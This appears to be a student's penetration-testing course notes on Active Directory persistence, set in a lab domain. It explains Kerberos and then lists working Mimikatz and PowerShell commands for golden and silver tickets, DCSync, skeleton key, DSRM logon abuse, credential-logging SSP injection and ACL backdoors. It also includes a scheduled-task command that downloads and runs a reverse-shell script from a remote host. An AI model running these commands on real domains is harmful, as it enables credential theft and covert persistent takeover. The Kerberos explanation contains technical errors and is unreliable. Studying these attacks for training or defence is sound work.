  <center><h1>Kerberos</h1></center>
- Kerberos is the basic of authentication in a Windows Actie Directory environment.
- It has been constantly attacked since it was implemented with attacks and scrutiy every couple of years.


<center><h1>How Kerberos works?</h1></center>

- KDC server is the heart of Kerberos Server.

1. Client sends NThash of password, a timestamp is encrypted with the hash and sent to the KDC (**Key Distribution Center**)
2. KDC has access to all the credential accross the network so it verifies and dehash the NTML hash sent by the client.
3. The TGT (**Ticket Granting Ticket**: Ticket which grants other tickets.) is encrypted, signed and delivered to the user (AS-REP). *Only **krbtgt** can open and read TGT data because it is encrypted with RC4 or NTLM of krbtgt password which only DC's have* .
4.  Client sends the TGT ticket back to the KDC as it is with krbtgt hash to request    TGS     (**Ticket Granting Service**) ticket.
5. Now KDC decrypts the hash because it has password of krbtgt and *if KDC can decrypt that then whatever is inside that is true*
6. Now KDC responds with TGS encrypted using service's NTML hash (TGS-REP) *So that cliient could not decrypt it cuz its encrypted using application server NTLM hash*
7. **User conncets to the server hosting the service on the appropriate port and presents the TGS**  Communication between client and server starts.
8. Application server make a optional PAC valid request ( Disabled by Default )
9. Application server recieves options PAC validation response
10. Then There might be an optional Mutual Authentication requests between CLient and Server

*DC validates user account only when TGT lifespan > 20 min.*

***Domain Persistence once we have Domain admin privileges***

<center><h1>Abuse1: Golden Ticket</h1></center>

So the main vulnerable trust was at the point

Now KDC decrypts the hash because it has password of krbtgt and *if KDC can decrypt that then whatever is inside that is true*

> If you have NLTM of krbtgt

So with this we can also create golden ticket.

![[2022-02-10 17_51_29-09-DomainPersistence-Part1.mp4 - VLC media player.png]]

- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
	- *If we can forge a TGT and present it to DC then it will see it as a vaild ticket*
	- Only validation is *if DC can decrypt the TGT*
- Since user account validation is nott done by Domain Controller (KDC service) until TGT is older than 20 min, we can use even delete/revoked accounts
- *The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine*.
- Password change has no effect on this attack


**So we need access to krbtgt account so that we can forge TGT ticket and send it to DC for Golden Ticket.**

```powershell
# Execute Mimikatz on DC to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc

# On any machine
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:<ntlm_hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

<center><b>Command</b></center>
![[2022-02-10 18_56_09-09-DomainPersistence-Part1.mp4 - VLC media player.png]]

![[2022-02-10 18_58_12-09-DomainPersistence-Part1.mp4 - VLC media player.png]]


- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges:
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain_name>\krbtgt"'
```
*Extract krbtgt hash from the DC using DCSync*

- Using DCDync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC.


<center><h2>Golden Ticket from mimikatz</h2></center>
Check for the privileges 
`Privilege '20' OK`

Command used: *Get debug rights.*
```powershell
privilege::debug
```

Now we dump the krbtgt hash

```powershell
lsadump::lsa /inject /name:krbtgt 
```

![[mimikatz golden ticket.png]]
*Highlighted boxes thigs you need*

**Now Create a golden ticket**

Command:
```powershell
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500 
```

**Now you have sucessfully created golden ticket**

Command:
```powershell
# Gives you new command prompt
misc::cmd
```


<center><h1>Abuse 2: Silver Ticket</h1></center>

***If you are not able to dump the hash of krbtgt user then you can use this attack.***

If you can extract NTLM hash of a service account then access the service using any user including high privilege user

> If you have service account NTLM hash

```bash
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063- 538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:cifs /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt"'



# Using service as HOST SPN

Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063- 538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt"'
```

> Similar command can ve used for any other service ex: HOST, RPCSS, WSMAN and many more.
> HOST SPN allows us to schedule and execute a task 

Creating a task:
```bash
# Creating task
schtasks /create /S domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-ObjectNet.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowershellTcp.ps1''')'"

# Executing task
schtasks /Run /S domain.local /TN "STCheck"
```

> - Try to get command execution on the DC by creating silver ticket for:
> 	- HOST service
> 	- WMI

<center><h1>Abuse 3: Skeleton Key</h1></center>

- Skeleton key is a persistence technique where it is possible to path Domain Controller (LSASS process) so that it allows access as any user with a single password.
- Performed by mimikatz which is done by injecting peice of malware into LSASS.

**REQUIREMENTS:**
- ***Attacker must have Domain Admin Rights***
- Attack must be performed on each and every DC for complete compromise
- Rebooting DC will remove this malware

Command:
```bash
Invoke-Mimikatz -Command "privilege::debug" "misc::skeleton" -ComputerName dcorp.domain.local
```
*Password is default mimikatz password*

> You can use it only once if LSASS got patched you cannot reuse it untill DC reboots

==You will see an error if lsass is already patched==

> LSASS (Local Security Authority Server Service) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.

[Resource](https://book.hacktricks.xyz/windows/active-directory-methodology/skeleton-key)

##### If LSASS is running in protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
```bash
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc:skeleton
!-
```
*This is a noisy process which could easily seen in logs- Service installation(Kernal Mode Driver)*



<center><h1>DSRM</h1></center>

By default DSRM doesnt allowed to logon into the DC in the Network

- DSRM is Directory  Service Restore Mode
- DSRM password is set when the server is promoted to Domain Controller. So it is rarely that somone chages it time to time, *Hence persitence time of this is longer than Golden Ticket Attack* 
- There is a local administrator on every DC called "Administrator"  *mostly* whose password is the DSRM password
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC

Dump DSRM password (Needs Domain Admin Privileges)
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
```
Compare the Adminitrator hash with the Administrator hash of below command
```bash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

- First one is the DSRM local Administrator.

*As we know DSRM dont have logon access so we need to chage it and for that we need to change the registry key*
```bash
Enter-PSSession -ComputerName dcorp-dc

New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior"" -Value 2 -PropertyType DWORD -Verbose

# if Item is already there check the item presence
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\""

# Set the Item property
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior"" -Value 2

Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"

``` 

**Requirements:**
- Domain Admin
- Regsitry Key Change to logon 2
- DSRM NTLM Hash

Pass the hash even after 6 months:
```bash
Invoke-Mimikatz -Command '"sekurlsa:pth /domain:dcorp-dc /user:Administrator /ntlm:<DSRM_Hash> /run:powershell.exe"'

ls \\dcorp-dc\C$
```

> You should discuss this risk cuz it is changing the registry key that is making more risk to client or we are downgrading the security of DC for this attack

<center><h1>SSP</h1></center>
*Bit more noisy and risky*
- A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are 
	- NTLM
	- Kerberos
	- Wdigest
	- CredSSP

- Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.

There are two ways from which we can use either of the ways:
	- Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security` Packages:
		![]()![[2022-05-14 23_47_51-11-DomainPersistence-Part3.mp4 - VLC media player.png]]
		*Once its done reboot the machine and logs will be stored on DC at `C:\Windows\system32\kiwissp.log`*
	- Using mimikatz, inject into lsass (Not Stable with server 2016):
		`Invoke-Mimikatz -Command '"misc::memssp"'`
		 *Doesnt require reboot.*
		 We can modify the mimilib.dll to log the data into directory (SYSVOL or NETLOGON) accessible by all the users which are not even Domain Admins



<center><h1>ACLs - Security Descriptors</h1></center>
- It is possible to modify Secuirty Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.
- Administrative privileges are required for this
- It, of course, works as a very useful and impactful backdoor mechanism.

*Persistence is high as very less companies that goes for ACL auditing*

- Security Descriptor Defination Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL
	- **ACE String:** ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
- ACE for built-in administrator for WMI namespaces
	- A;Cl;CCDCLCSWRPWPRCWD;;SID


We will make a normal user privilege elevated in such a way that it can execute WMI queries on DC 

WMI authentication consists of two parts:
1. We must have privilege to connect to dcorp-dc.domain.local
2. We must have privilege to connect to namespace
*Hence we need to modify ACL of two components*

***GUI:***
For doing this watch DP5::6:42 

***Scripts:***
- Load Set-RemoteWMI in the current session which having Domain Admin privileges.
	`. .\Set-RemoteWMI.ps1`
- ACLs can be modified to allow non-admin users access to securable objects
	- On local machine for student1
		`Set-RemoteWMI -UserName student1 -Verbose`
	- On remote machine for student1 without explicit credentials:
		`Set-RemoteWMI -UserName studenttttttt1 -ComputerName dcorp-dc.domain.local -namespace 'root\cimv2' -Verbose`
	- On remote machien with explicit credentials. Only root\\cimv2 and nested namespaces:
		`Set-RemoteWMI -UserName studenttttttt1 -ComputerName dcorp-dc.domain.local -Credential Administrator -namespace 'root\cimv2' -Verbose`
	*After this you will have full controls and to remove those permissions you need to execute next command*
	- On remote machine remove permissions:
		`Set-RemoteWMI -UserName studenttttttt1 -ComputerName dcorp-dc.domain.local -namespace 'root\cimv2' -Verbose`


## ACLs - Security Descriptors - PowerShell Remoting
`Set-RemotePSRemoting.ps1` is an POC script 

- On local machine for student1
	`Set-RemotePSRemoting -UserName student1 -Verbose`
- On remote machine for student1 without credentials
	`Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc.domain.local -Verbose`
- On remote machine, remove the permissions:
	`Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc.domain.local -Remove`


## ACLs - Security Descriptors - Remote Registry
***Load `Add-RemoteRegBackdoor & Get-RemoteMachineAccountHash` in the current session***
- Using DAMP, with admin privs remote machine
	`Add-RemoteRegBackdoor -ComputerName dcorp-dc.domain.local -Trustee student1 -Verbose`
	*Modify the permission on acquired registry keys and services.*
- As student1, retrive machine account hash:
	`Get-RemoteMachineAccountHash -ComputerName dcorp-dc.domain.local -Verbose`
	*Then we can start extracting information.*
- Retrive local account hash:
	`Get-RemoteLocalAccountHash -ComputerName dcorp-dc.domain.local -Verbose`
- Retrive domain cached credentials:
	`Get-RemoteCachedCredential -ComputerName dcorp-dc.domain.local -Verbose`

DP5:: 23:00

***This gives us the hash of dcorp-dc.domain.local hence DC and further on we can create a Silver Ticket with that Hash***
***We can also get the DSRM password and gain a persistent access***
	`Get-RemoteLocalAccountHash -Computername dcorp-dc -Verbose`

- It is very stealthy as not many company go through with ACLs auditing



## ACLs - AdminSDHolder
AdminSDHolder stands for Admin Security Discriptor Holder which have its own ACL and holds/contains protected groups and each and evey 60mins system resets the protective groups ACL to match with AdminSDHolder group.

**Protected Groups**
- Account Operators
- Enterprise Admins
- Backup Operations
- Domain Controllers
- Server Operators
- Read-Only Domain Controllers
- Print Operators
- Schema Admins
- Domain Admins
- Administrators
- Replicator

Well known abuse of some of the Protected Groups - All of the below can log on locally to DC
|Protected Group|Description|
|--|--|
|Account Operators|Cannot modify DA/EA/BA groups. Can modify nested group within these groups.|
|Backup Operators|Backup GPO, edit to add SID of Controlled account to a privileged group and Restore.|
|Server Operators|Run a command as system (using the disabled Browser service.|
|Print Operators|Copy ntds.dit backup, load device drivers.|

- Command to do AdminSDHolder 
	`.\Invoke-SDPropagator.ps1`
- Exploit: If we could add our gained admin to the ACL list of AdminSDHolder group then we can have Propogation access. (**Interactive Logon**)
- **Remote Exploit:** 
	- Add FullControl permissions for a user to AdminSDHolder using PowerView as DA:
		`Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose`
	- Using ActiveDirectory Module and Set-ADACL:
		`Set-ADACL -DistinguishedName 'CN=AdminSDHolder, CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose`
	- Check the Domain Admins permission - 
		- PowerView as normal User:
		`Get-ObjectAcl -SameAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student1'}`
		- Using ActiveDirectory Module:
		`(Get-Acl -path 'AD:\CN=Domain Admins,Cn=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}`
	- Abuse FullControl using PowerView_dev:
	`Add-DomaingroupMember -Identity 'Domain Admins' -Members testda -Verbose`
	- Using ActiveDirectory Module:
		`Add-ADGroupMember -Identity 'Domain Admins' -Member testda`
	- **Reset Password** of any domain admin and we dont even have to make a new user.
		- Abusing ResetPassword using powerView_dev:
		`Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`
		- Using ActiveDirectory Module:
		`Set-AdAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose`


## ACLs - Rights Abuse
- Add rights for DCSync:
`Add-ObjectAcl -TargetDistinguishedName 'DC=dolarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student1 -Rights DCSync -Verbose`
- using ActiveDirectory Module and Set-ADACL:
`Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=money,DC=local' -Principal student1 -GUIDRight DCSync -Verbose`
